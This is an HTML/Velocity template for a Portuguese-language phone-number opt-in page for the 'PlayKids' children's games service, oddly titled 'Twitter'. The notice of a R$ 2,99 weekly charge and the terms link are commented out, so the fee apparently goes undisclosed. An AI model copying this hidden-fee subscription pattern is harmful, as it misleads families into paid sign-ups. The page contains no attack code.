	<title>Twitter</title>

	<script type="text/javascript">
		function proximoCampo(atual,proximo){
			if(atual.value.length >= atual.maxLength){
				document.getElementById(proximo).focus();
			}}
		</script>

		<script type="text/javascript">
			function validatePhone(numeroddd, numerocelular) {
				return !(numeroddd == '' || numerocelular == '');
			}

			function validate(){
				var ddd = document.getElementById('ddd').value;
				var celular = document.getElementById('celular').value;
				var checkAccept = document.getElementById('check');

				if (!validatePhone(ddd, celular)) {
					alert('Informe seu número corretamente.');
					return false;
				}

				if (checkAccept != null && !checkAccept.checked) {
					alert('Por favor, aceite o termo de uso para continuar.');
					return false;
				}

				document.form1.submit();
			}
		</script>

</head>

	<div class="container">
		<h1>O PlayKids é diversão para toda a família!</h1>
		<div class="banner">
			<img src="resources/img/super.png" alt="">
		</div>
		<p class="disclaimer">
			Jogos educativos, sem propaganda etc
		</p>
		<!-- 		<p class="nro-telefone">Telefone: <span id="number">19 99650 0569</span></p> -->
		<form name="form1" action="#springUrl( $subscriptionURL )" method="post">
			#if( $hiddenFieldsMap.entrySet() )
			#foreach($hiddenField in $hiddenFieldsMap.entrySet())
			<input type="hidden" name="$hiddenField.key" value="$hiddenField.value" />
			#end
			#end
			<div class="inputs">
				<input id="ddd" name="ddd" autofocus placeholder="DDD" required onkeydown="return numbers(event);" maxlength="2" onKeyUp="toUnicode(this,this.value)" />
				<input id="celular" name="phone" placeholder="Celular" required onkeydown="return numbers(event);" maxlength="9" onKeyUp="toUnicode(this,this.value)" />
			</div>
			#if( $message )
			<p class="error">
				$message
			</p>
			#end
			<input type="button" value="Continuar" class="botao" onclick="optin();" />
			<!-- <p class="footer">Ao assinar, você concorda com os <a href="termos.html">termos e condições</a> e aceita a tarifa de R$ 2,99 por semana.</p> -->
		</form>
	</div>
